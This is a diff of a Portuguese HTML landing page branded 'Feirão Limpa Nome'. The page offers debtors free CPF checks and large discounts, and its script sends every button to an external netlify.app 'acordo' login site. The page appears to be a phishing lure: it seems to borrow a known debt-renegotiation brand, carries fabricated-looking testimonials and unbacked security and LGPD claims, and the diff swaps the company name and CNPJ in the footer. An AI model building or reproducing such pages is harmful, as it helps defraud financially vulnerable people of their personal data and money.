+            <p class="tm-quote">"Recebi 99% de desconto — foi um descontão! Agora posso dormir em paz, me sinto mais leve e vou poder comprar o que preciso, sem fazer novas dívidas."</p>
+            <div class="tm-author">
+              <div class="tm-avatar">ER</div>
+              <div>
+                <div class="tm-name">Elza Ribeiro Costa</div>
+                <div class="tm-loc"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>Cliente de nome limpo</div>
+              </div>
+            </div>
+          </article>
+
+          <article class="tm-card">
+            <div class="tm-stars">
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+            </div>
+            <p class="tm-quote">"Estou me sentindo feliz da vida! Carregava essa dívida há 8 anos, mas agora o caminho está livre. Vou seguir com sabedoria. Isso é ótimo!"</p>
+            <div class="tm-author">
+              <div class="tm-avatar">JX</div>
+              <div>
+                <div class="tm-name">Jairo Xavier de Souza</div>
+                <div class="tm-loc"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>Cliente de nome limpo</div>
+              </div>
+            </div>
+          </article>
+
+        </div>
+      </div>
+
+      <div class="tm-controls">
+        <button class="tm-arrow" id="tmPrev" aria-label="Anterior">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+        </button>
+        <div class="tm-dots" id="tmDots"></div>
+        <button class="tm-arrow" id="tmNext" aria-label="Próximo">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
         </button>
       </div>
-
-      <p class="mt-4 text-center text-xs text-slate-500">
-        Ao continuar, você concorda com nossos
-        <a href="termos.html" class="underline hover:text-brand-600">Termos</a> e
-        <a href="privacidade.html" class="underline hover:text-brand-600">Política de Privacidade</a>.
-      </p>
     </section>
-  </main>
 
-  <footer class="border-t border-slate-200 bg-white">
-    <div class="mx-auto max-w-3xl px-6 py-6 text-xs text-slate-500 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
-      <div>
-        <p class="font-medium text-slate-700">V L Comercial LTDA</p>
-        <p>CNPJ 49.836.650/0001-60</p>
+  <!-- ═══════════ FAQ ═══════════ -->
+  <section class="section" id="duvidas">
+    <span class="section-eyebrow">Dúvidas frequentes</span>
+    <h2 class="section-title">Perguntas comuns</h2>
+    <p class="section-sub">Tudo o que você precisa saber sobre a consulta e regularização.</p>
+
+    <div class="faq-list">
+      <details class="faq-item">
+        <summary class="faq-summary">A consulta é realmente gratuita?</summary>
+        <div class="faq-content">Sim, a consulta ao seu CPF no sistema é 100% gratuita. Você só paga se decidir fechar um acordo de negociação de dívida.</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-summary">Quanto tempo demora para limpar o nome?</summary>
+        <div class="faq-content">Após a confirmação do pagamento do acordo, o sistema atualiza sua situação em até 1 hora útil, removendo as restrições do seu CPF.</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-summary">A consulta afeta meu score de crédito?</summary>
+        <div class="faq-content">Não. Realizar a consulta do seu próprio CPF é um direito seu e não impacta negativamente sua pontuação de score.</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-summary">Meus dados estão seguros?</summary>
+        <div class="faq-content">Sim, utilizamos criptografia de ponta a ponta e seguimos rigorosamente as diretrizes da LGPD (Lei Geral de Proteção de Dados).</div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ═══════════ Trust / Segurança ═══════════ -->
+  <section class="trust">
+    <div class="trust-grid">
+      <div class="trust-item">
+        <div class="trust-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        </div>
+        <div class="trust-h">Segurança Total</div>
+        <p class="trust-p">Seus dados são protegidos por criptografia de nível bancário.</p>
       </div>
-      <nav class="flex flex-wrap gap-4">
-        <a href="privacidade.html" class="hover:text-brand-600">Privacidade</a>
-        <a href="termos.html" class="hover:text-brand-600">Termos</a>
-        <a href="contato.html" class="hover:text-brand-600">Contato</a>
-      </nav>
+      <div class="trust-item">
+        <div class="trust-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        </div>
+        <div class="trust-h">Conformidade LGPD</div>
+        <p class="trust-p">Tratamos seus dados com total privacidade e respeito à lei.</p>
+      </div>
+      <div class="trust-item">
+        <div class="trust-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        </div>
+        <div class="trust-h">Atendimento 24h</div>
+        <p class="trust-p">Nossa plataforma funciona todos os dias, a qualquer hora.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════ Footer ═══════════ -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <img class="footer-logo" src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663304183709/niRZDrggAaZWXjkq.png" alt="Feirão Limpa Nome">
+        <p class="footer-about">A maior plataforma de renegociação de dívidas do Brasil. Ajudando milhões de brasileiros a recuperar sua dignidade financeira.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Links Úteis</h4>
+        <ul>
+          <li><a href="#como-funciona">Como funciona</a></li>
+          <li><a href="#duvidas">Dúvidas frequentes</a></li>
+          <li><a href="#">Privacidade</a></li>
+          <li><a href="#">Termos de uso</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Atendimento</h4>
+        <div class="footer-contact">
+          <div class="footer-contact-item">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/></svg>
+            0800 591 1222
+          </div>
+          <div class="footer-contact-item">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+            contato@limpanome.com.br
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <div class="footer-legal">© 2026 Feirão Limpa Nome. Todos os direitos reservados. CNPJ: 62.173.620/0001-80. Av. das Nações Unidas, 14.401 - São Paulo/SP.</div>
+      <div class="footer-socials">
+        <a href="#"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
+        <a href="#"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg></a>
+      </div>
     </div>
   </footer>
 
-<script>
-  (function(){
-    var DEST = "https://acordo-feirao2026.netlify.app/";
-    var track = document.getElementById('track');
-    var thumb = document.getElementById('thumb');
-    var label = document.getElementById('label');
-    var x = 0, dragging = false, done = false, startX = 0, max = 0;
+  <script>
+  (function() {
+    // ─── Lógica de redirecionamento ───
+    function goToLogin() {
+      // Link solicitado pelo usuário
+      const targetUrl = "https://acordo-feirao2026.netlify.app/";
+      const dest = new URL(targetUrl);
+      const src  = new URLSearchParams(window.location.search);
+      
+      // Preserva parâmetros UTM se existirem
+      src.forEach((v, k) => { if (v) dest.searchParams.set(k, v); });
+      
+      // Suplementa com UTMs do storage se não vierem na URL atual
+      try {
+        const saved = JSON.parse(localStorage.getItem('utmParams') || '{}');
+        Object.entries(saved).forEach(([k, v]) => {
+          if (v && !dest.searchParams.has(k)) dest.searchParams.set(k, v);
+        });
+      } catch (e) {}
+      
+      // Redirecionamento
+      try { window.location.assign(dest.toString()); }
+      catch (e) { window.location.href = dest.toString(); }
+    }
 
-    function recalc(){ max = track.clientWidth - 64; }
-    function setX(v){
-      x = Math.max(0, Math.min(max, v));
-      thumb.style.transform = 'translateX(' + x + 'px)';
-      label.style.opacity = String(1 - x / Math.max(max,1));
-      if (x >= max - 4 && !done){
-        done = true;
-        label.textContent = 'Liberando...';
-        label.style.opacity = '1';
-        setTimeout(function(){ window.location.href = DEST; }, 350);
+    const btns = [
+      document.getElementById('ctaStart'),
+      document.getElementById('ctaFinal'),
+      document.getElementById('footerCta')
+    ].filter(Boolean);
+
+    let navigating = false;
+    btns.forEach(b => b.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (navigating) return;
+      navigating = true;
+      b.style.opacity = '0.85';
+      try { goToLogin(); }
+      catch (err) {
+        console.error('[Home] Falha no redirect, re-habilitando:', err);
+        navigating = false;
+        b.style.opacity = '';
       }
-    }
-    function start(clientX){
-      if(done) return;
-      dragging = true; recalc(); startX = clientX - x;
-      thumb.style.transition = 'none';
-    }
-    function move(clientX){ if(dragging) setX(clientX - startX); }
-    function end(){
-      if(done || !dragging) return;
-      dragging = false;
-      thumb.style.transition = 'transform 250ms ease';
-      setX(0);
-    }
+      setTimeout(() => { navigating = false; b.style.opacity = ''; }, 2500);
+    }));
 
-    thumb.addEventListener('mousedown', function(e){ start(e.clientX); });
-    thumb.addEventListener('touchstart', function(e){ start(e.touches[0].clientX); }, {passive:true});
-    window.addEventListener('mousemove', function(e){ move(e.clientX); });
-    window.addEventListener('touchmove', function(e){ move(e.touches[0].clientX); }, {passive:true});
-    window.addEventListener('mouseup', end);
-    window.addEventListener('touchend', end);
-    window.addEventListener('resize', recalc);
-    recalc();
+    // ─── Carousel de depoimentos ───
+    const track = document.getElementById('tmTrack');
+    const cards = track ? track.querySelectorAll('.tm-card') : [];
+    const dotsEl = document.getElementById('tmDots');
+    const prev = document.getElementById('tmPrev');
+    const next = document.getElementById('tmNext');
+
+    if (track && cards.length > 0) {
+      let current = 0;
+      let autoTimer = null;
+
+      function visibleCount() {
+        const w = window.innerWidth;
+        if (w >= 1000) return 3;
+        if (w >= 720)  return 2;
+        return 1;
+      }
+
+      function totalPages() {
+        return Math.max(1, cards.length - visibleCount() + 1);
+      }
+
+      function buildDots() {
+        dotsEl.innerHTML = '';
+        const n = totalPages();
+        for (let i = 0; i < n; i++) {
+          const d = document.createElement('span');
+          d.className = 'tm-dot' + (i === current ? ' active' : '');
+          d.addEventListener('click', () => goTo(i));
+          dotsEl.appendChild(d);
+        }
+      }
+
+      function applyTransform() {
+        const card = cards[0];
+        const gap = parseFloat(getComputedStyle(track).gap) || 16;
+        const w = card.getBoundingClientRect().width + gap;
+        track.style.transform = `translateX(-${current * w}px)`;
+        [...dotsEl.children].forEach((d, i) => d.classList.toggle('active', i === current));
+      }
+
+      function goTo(i) {
+        const max = totalPages() - 1;
+        current = Math.max(0, Math.min(i, max));
+        applyTransform();
+      }
+
+      function nextSlide() { goTo((current + 1) % totalPages()) }
+      function prevSlide() { goTo(current === 0 ? totalPages() - 1 : current - 1) }
+
+      function resetAuto() {
+        if (autoTimer) clearInterval(autoTimer);
+        autoTimer = setInterval(nextSlide, 5000);
+      }
+
+      prev.addEventListener('click', () => { prevSlide(); resetAuto(); });
+      next.addEventListener('click', () => { nextSlide(); resetAuto(); });
+
+      window.addEventListener('resize', () => { buildDots(); goTo(0); });
+
+      buildDots();
+      applyTransform();
+      resetAuto();
+    }
   })();
-</script>
+  </script>
 </body>
 </html>
